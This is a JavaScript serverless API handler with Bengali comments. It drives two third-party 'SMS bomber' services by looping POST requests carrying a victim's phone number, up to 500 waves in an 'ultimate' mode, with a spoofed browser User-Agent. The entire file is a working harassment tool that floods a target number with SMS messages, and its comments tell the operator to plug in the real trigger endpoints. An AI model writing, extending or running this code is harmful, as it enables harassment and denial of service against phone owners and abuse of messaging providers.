export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // ⚠️ এখানে তোমার ২টা সাইটের আসল TRIGGER endpoint বসাও
  const targets = [
    { url: 'https://shadowx-sms-bomber.onrender.com/api/trigger', // <-- আসল path
      body: { number, amount: 1, country: 'BD' } },
    { url: 'https://nuke-sms-bomber.pages.dev/api/trigger',        // <-- আসল path
      body: { number, amount: 1, country: 'BD' } },
  ];

  const totalWaves = isUltimate ? 500 : amount;
  const delay = isUltimate ? 500 : 2000;

  // 🔧 serverless-এ long loop চলে না, তাই কাজটা ব্যাকগ্রাউন্ডে না রেখে
  //    ছোট করে await করছি (Vercel Hobby = 10s, Pro = 60s max)
  const results = [];

  for (let i = 0; i < totalWaves; i++) {
    const wave = targets.map(async (t) => {
      try {
        const r = await fetch(t.url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0',
            // ওদের যদি API key লাগে:
            // 'x-api-key': process.env.TARGET_API_KEY,
          },
          body: JSON.stringify(t.body),
        });

        const text = await r.text();
        if (!r.ok) {
          console.log('❌', t.url, r.status, text.slice(0, 200));
        } else {
          console.log('✅', t.url, r.status, text.slice(0, 200));
        }
        return { url: t.url, status: r.status, ok: r.ok };
      } catch (err) {
        console.log('💥', t.url, err.message);
        return { url: t.url, error: err.message };
      }
    });

    results.push(...(await Promise.all(wave)));
    await new Promise(r => setTimeout(r, delay));
  }

  // এত লম্বা লুপ serverless-এ টাইমআউট করবে,
  // তাই অল্প wave হলে ঠিক আছে, বেশি হলে queue লাগবে
  return res.status(200).json({ success: true, results });
}
